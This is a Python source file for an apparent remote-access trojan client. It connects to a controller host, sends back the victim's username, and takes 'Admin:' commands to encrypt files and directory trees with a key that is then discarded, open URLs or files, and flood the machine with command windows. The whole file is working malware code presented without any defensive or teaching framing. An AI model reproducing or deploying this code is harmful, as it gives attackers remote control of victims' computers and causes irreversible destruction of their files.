import socket
import threading
import getpass
import os
import webbrowser
from cryptography.fernet import Fernet


IP = "replace_with_public_ip"
PORT = 9999

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def generate_key():
    return Fernet.generate_key()

def decrypt_file(filename, key):
    fernet = Fernet(key)

    with open(filename, "rb") as file:
        file_data = file.read()

    decrypted_data = fernet.decrypt(file_data)

    with open(filename, "wb") as file:
        file.write(decrypted_data)

def decrypt_directory(path, key):
    for root, dirs, files in os.walk(path):
        for file in files:
            file_path = os.path.join(root, file)
            decrypt_file(file_path, key)

def encrypt_file(filename, key):
    fernet = Fernet(key)

    with open(filename, "rb") as file:
        file_data = file.read()

    encrypted_data = fernet.encrypt(file_data)

    with open(filename, "wb") as file:
        file.write(encrypted_data)

def encrypt_directory(path, key):
    for root, dirs, files in os.walk(path):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path, key)

def perform_action(command, payload):
    if command == "echo":
        return payload
    elif command == "reverse":
        return payload[::-1]
    elif command.startswith("-crypt"):
        key = generate_key()
        if os.path.isfile(payload):
            encrypt_file(payload, key)
        elif os.path.isdir(payload):
            encrypt_directory(payload, key)
        else:
            send_result("Invalid file or directory path")
        send_result("Encryption completed")

    elif command.startswith("-decrypt"):
        if key is None:
            return "Decryption key not provided"
        if os.path.isfile(payload):
            decrypt_file(payload, key)
        elif os.path.isdir(payload):
            decrypt_directory(payload, key)
        else:
            send_result("Invalid file or directory path")
        send_result("Decryption completed")

    elif command.startswith("-open_url"):
        webbrowser.open(payload)

    elif command.startswith("-open_file"):
        os.startfile(payload)

    elif command == "-c_flood":
        while True:
            os.startfile("cmd")

    elif command == "-cwd":
        send_result(os.getcwd())
    else:
        send_result("Unknown command")

def receive_messages():
    while True:
        try:
            message = client.recv(1024).decode("utf-8")
            if message.startswith("Admin:"):
                _, _, command_msg = message.partition(": ")
                command, _, payload = command_msg.partition(" ")
                result = perform_action(command, payload)
                send_result(result)
        except:
            client.close()
            break

def send_result(result):
    message = f"{nickname}: {result}"
    client.send(message.encode("utf-8"))

def connect_to_server():
    client.connect((IP, PORT))
    message = client.recv(1024).decode('utf-8')
    if message == "ID":
        nickname = getpass.getuser()
        client.send(nickname.encode('utf-8'))

    receive_thread = threading.Thread(target=receive_messages)
    receive_thread.start()

if __name__ == "__main__":
    connect_to_server()
